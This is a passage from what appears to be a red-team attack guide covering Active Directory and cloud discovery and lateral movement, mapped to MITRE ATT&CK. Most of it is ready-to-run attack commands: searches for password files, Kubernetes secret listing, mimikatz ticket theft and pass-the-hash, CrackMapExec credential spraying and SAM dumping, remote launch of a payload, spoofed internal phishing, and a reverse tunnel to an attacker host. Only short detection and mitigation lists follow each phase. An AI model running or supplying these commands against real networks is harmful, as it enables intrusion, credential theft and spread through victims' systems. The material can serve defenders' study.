 Domain accounts
net user /domain
Get-ADUser -Filter *

# Administrator accounts
net localgroup administrators
Get-ADGroupMember -Identity "Domain Admins"
```

### 5. Network Share Discovery (T1135)
```powershell
# Enumerate shares
net view \\TARGET
Get-SmbShare

# Find accessible shares
$computers = Get-ADComputer -Filter *
foreach ($comp in $computers) {
    net view \\$comp.Name /all
}
```

### 6. Remote System Discovery (T1018)
```powershell
# Active Directory enumeration
Get-ADComputer -Filter * | Select-Object Name,IPv4Address

# ARP cache
arp -a

# Network neighbors
net view /all
```

### 7. Process Discovery (T1057)
```powershell
# Windows processes
Get-Process
tasklist /v

# Linux processes
ps aux
pstree -p
```

### 8. File and Directory Discovery (T1083)
```bash
# Search for sensitive files
dir /s /b C:\ | findstr /i "password credential secret"

# Linux file search
find / -name "*password*" 2>/dev/null
locate password | grep -i config
```

### 9. Cloud Infrastructure Discovery (T1580)
```bash
# AWS enumeration
aws ec2 describe-instances
aws s3 ls
aws iam list-users

# Azure enumeration
az vm list
az storage account list
az ad user list

# GCP enumeration
gcloud compute instances list
gcloud storage buckets list
gcloud projects list
```

### 10. Container Discovery (T1613)
```bash
# Docker enumeration
docker ps -a
docker images
docker network ls

# Kubernetes enumeration
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get secrets --all-namespaces
```

---

## Automated Discovery Tools

### BloodHound - Active Directory Mapping
```powershell
# Collect data
.\SharpHound.exe -c All -d corporate.local

# Upload to BloodHound
# Analyze attack paths to Domain Admin
```

### PowerView - AD Enumeration
```powershell
Import-Module PowerView.ps1

# Find domain controllers
Get-DomainController

# Find shares with access
Find-DomainShare -CheckShareAccess

# Find machines where domain admin is logged in
Find-DomainUserLocation -UserIdentity "Domain Admins"

# ACL abuse paths
Find-InterestingDomainAcl -ResolveGUIDs
```

### ADRecon - Comprehensive AD Audit
```powershell
.\ADRecon.ps1 -GenExcel C:\Temp\ADRecon-Report.xlsx
```

---

## Detection & Mitigation

**Detection**:
- Monitor for enumeration commands
- Detect BloodHound/SharpHound
- Alert on mass LDAP queries
- Track unusual reconnaissance patterns

**Mitigation**:
- Limit LDAP query access
- Monitor privileged account usage
- Implement honeypot accounts
- Network segmentation

---

**Next**: [Phase 8: Lateral Movement →](../08-collection-exfiltration/README.md)
**Previous**: [← Phase 6: Credential Access](../06-credential-access/README.md)

---

**Last Updated**: January 2025
**Author**: Advanced Threat Research Team

---

# Phase 8: Lateral Movement

## 🎯 Overview

Lateral Movement enables adversaries to pivot through a network, accessing multiple systems to achieve objectives. Essential for APT operations targeting distributed networks.

### MITRE ATT&CK: Lateral Movement (TA0008)
**Coverage**: 9 techniques including remote services, credential replay, and software deployment tools.

---

## Key Techniques

### 1. Remote Desktop Protocol (T1021.001)
```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Connect via RDP
mstsc /v:192.168.1.100
```

### 2. SMB/Windows Admin Shares (T1021.002)
```powershell
# Access admin share
net use \\192.168.1.100\C$ /user:DOMAIN\admin password

# Copy payload
copy payload.exe \\192.168.1.100\C$\Windows\Temp\

# Execute remotely via WMI
wmic /node:192.168.1.100 process call create "C:\Windows\Temp\payload.exe"
```

### 3. PsExec (T1021.002)
```bash
# Sysinternals PsExec
psexec.exe \\192.168.1.100 -u DOMAIN\admin -p password cmd.exe

# Impacket psexec
impacket-psexec DOMAIN/admin:password@192.168.1.100
```

### 4. WinRM (T1021.006)
```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Execute remote command
Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock {whoami}

# Interactive session
Enter-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)
```

### 5. SSH (T1021.004)
```bash
# SSH lateral movement
ssh user@192.168.1.100

# With stolen key
ssh -i stolen_key user@192.168.1.100

# Port forwarding
ssh -L 8080:internal-server:80 user@192.168.1.100
```

### 6. Pass-the-Hash (T1550.002)
```bash
# Impacket PTH
impacket-psexec -hashes :NTLMHASH administrator@192.168.1.100

# CrackMapExec PTH
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLMHASH --exec-method smbexec -x whoami
```

### 7. Pass-the-Ticket (T1550.003)
```powershell
# Export ticket
mimikatz.exe "sekurlsa::tickets /export" "exit"

# Inject ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Access remote system
dir \\server01\C$
```

### 8. Overpass-the-Hash (T1550.002)
```powershell
# Request TGT with NTLM hash
mimikatz.exe "sekurlsa::pth /user:admin /domain:corporate.local /ntlm:hash /run:powershell.exe" "exit"

# Use new PowerShell session with Kerberos
```

### 9. DCOM Execution (T1021.003)
```powershell
# MMC20.Application DCOM
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.100"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")

# ShellWindows DCOM
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","192.168.1.100"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### 10. Internal Spearphishing (T1534)
```powershell
# Send phishing email from compromised account
Send-MailMessage -To "victim@corporate.local" -From "ceo@corporate.local" -Subject "Urgent: Review Document" -Body "Please review the attached document" -Attachments "malicious.docm" -SmtpServer "mail.corporate.local"
```

---

## Advanced Lateral Movement

### Impacket Suite Tools
```bash
# wmiexec - Semi-interactive shell via WMI
impacket-wmiexec DOMAIN/admin:password@192.168.1.100

# smbexec - Semi-interactive shell via SMB
impacket-smbexec DOMAIN/admin:password@192.168.1.100

# atexec - Execute command via Task Scheduler
impacket-atexec DOMAIN/admin:password@192.168.1.100 "whoami"

# dcomexec - Execute via DCOM
impacket-dcomexec DOMAIN/admin:password@192.168.1.100 "calc.exe"
```

### CrackMapExec Mass Exploitation
```bash
# Spray credentials across network
crackmapexec smb 192.168.1.0/24 -u admin -p password --exec-method smbexec -x "powershell -enc <BASE64>"

# Multiple credentials
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success

# Dump SAM hashes
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Execute module
crackmapexec smb 192.168.1.0/24 -u admin -p password -M mimikatz
```

### Pivoting & Tunneling
```bash
# SSH SOCKS proxy
ssh -D 9050 user@pivot-host

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24

# Metasploit pivot
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run

# Add route
route add 10.10.10.0/24 session_id

# Chisel tunnel
# On attacker
./chisel server -p 8080 --reverse

# On pivot
./chisel client attacker-ip:8080 R:socks
```

---

## Detection & Mitigation

**Detection**:
- Monitor for unusual authentication patterns
- Detect lateral movement tools (PsExec, WMI)
- Alert on admin share access
- Track pass-the-hash attempts

**Mitigation**:
- Disable unnecessary protocols (SMB1, LLMNR)
- Implement network segmentation
- Use credential tiering
- Enable SMB signing
- Monitor privileged account usage

---

**Next**: [Phase 9: Command & Control →](../09-command-control/README.md)
**Previous**: [← Phase 7: Discovery](../07-discovery-lateral-movement/README.md)

---

**Last Updated**: January 2025
**Author**: Advanced Threat Research Team